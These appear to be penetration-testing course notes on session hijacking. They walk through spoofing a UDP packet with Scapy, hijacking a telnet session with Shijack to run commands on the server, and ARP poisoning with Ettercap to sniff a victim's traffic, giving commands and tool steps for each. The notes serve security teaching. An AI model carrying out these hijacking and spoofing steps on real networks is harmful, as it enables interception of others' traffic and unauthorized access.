**Instructor: Ashwin Iyer**

#### Session Hijacking:

- Types:
  | Application Level           |   Network Level          |
  |-----------------------------|--------------------------|
  | Sniffing (MITM)             | Sniffing (MITM)          |
  | Session Fixation            | Predicting the sequence  |
  | Session ID Bruteforce       | UDP Session Hijacking    |
  | Session Donation            | DNS Session Hijacking    |
  | XSS                         | Telnet Session Hijacking |
  | Man in the Browser (MITB)   | ARP Poisoning            |
  |                             | IP Spoofing              |
  |                             | SSL Strip                |

---

#### UDP Hijacking (**/w Scapy**)

  - For demonstration purpose we'll create a **UDP server** using **netcat** as follows:
    > $ `nc -vv -n -u -l -p 7777`
    >
    > **listening on [any] 7777 ...**

  - And on the **victim's machine**` as follows:
    > $ `nc -vv -u <udp_server's_ip> 7777`
    >
    > **(UNKNOWN) [<udp_server's_ip>] 7777 (?) open**
    >
    > hi       **<------(This message is typed and sent by the victim to the server server)**

  - #### On the UDP server's side:
    > **hiconnect to [<udp_server's_ip>] from (UNKNOWN) [<victim's_ip>] 63868**    **<------(victim's port)**
    >
    > hi

  - Now using **Scapy** we can craft and spoof a UDP packet from the **attacker's machine** as follows:
    > $ `scapy3`
    >```py
    > >>> i=IP()
    > >>> i.dst="<udp_server's_ip>"
    > >>> i.src="<victim's_ip>"
    > >>> u=UDP()
    > >>> u.dport=7777
    > >>> u.sport=63868
    >```
    > The **victim's source port (63868)** is found from [here](#on-the-udp-servers-side) or in general in real-time the attacker uses **Wireshark** to find active UDP connection and find factors related to the attack. Continuing on,
    >```py
    > >>> payload="YOUHAVEBEENPWNED"
    > >>> packet=i/u/payload
    > >>> packet.display()
    > >>> send(packet)
    >```

  - #### After sending the spoofed packet the following would be seen on the UDP server's side:
    > YOUHAVEBEENPWNED **<------(Spoofed packet payload received by the UDP server)**

---

#### Telnet Hijacking (/w Shijack):
  - Telnet will not check the source IP address from the received packets, and using that we can sniff network and get a sequence of it to start our attack using a tool called [Shijack](https://packetstormsecurity.com/files/24657/shijack.tgz.html)
    - First we connect the **victim's machine** to the telnet server using the following command:
      > $ `telnet <server_ip>`
    - Then we use `shijack-lnx` on the **attacker's machine** to hijack the telnet session as follows:
    - > $ `./shijack-lnx <interface> <spoofed_victim's_ip> <victim's_port> <server's_ip> 23`
      >
       Here the **<spoofed_victim's_ip>** and **<victim's_port>** can be found using a packet capture tool like **Wireshark**.

    - Now on the attacker's machine there appears a message:
      > Got packet! SEQ = 0x\<random_sequence_number\> ACK = 0x\<random_ack_number\>
      >
      which means we've hijacked the session. To check that we can enter a command like `mkdir pwned` and see whether the folder `pwned` is being created on the telnet server

---

#### ARP Spoofing (/w Ettercap):
  > Tricking Host A(generally a **victim's machine**) by saying that the attacker is Host B(generally a **target router**) and tricking Host B by saying that the attacker is Host A. This in result creates a change in the ARP table of both the Host A and B.

-  To perform ARP spoofing we'll use the **Ettercap** GUI tool present by default in most penetration testing linux distros as follows:
    > **[CLICK]** <kbd>...</kbd> > <kbd>Hosts </kbd> > <kbd>Scan for hosts</kbd>

    After scanning all hosts we need to list them down:
    > **[CLICK]** <kbd>...</kbd> > <kbd>Hosts</kbd> > <kbd>Hosts list</kbd>

    Now we need to add the **gateway(generally the router)** as Target 1.
    
    So **[SELECT]** the gateway from the Host list and **[CLICK]** <kbd>Add to Target 1</kbd>.

    Then the target machine, so **[SELECT]** the target ip from the Host list and **[CLICK]** <kbd>Add to Target 2</kbd>.

    Finally **[CLICK]** <kbd>🌐</kbd> and check the following param:
      - [x] Sniff remote connections.
      - [ ] Only poison one-way.
    
    After this the information send from the victim's machine that's unencrypted can be seen in **Ettercap**. Also encrypted communication channel communicating, their headers can be seen using **Wireshark** (unless a VPN is not used by the victim!) which at least lets us know what all websites are being visited by the victim.

---
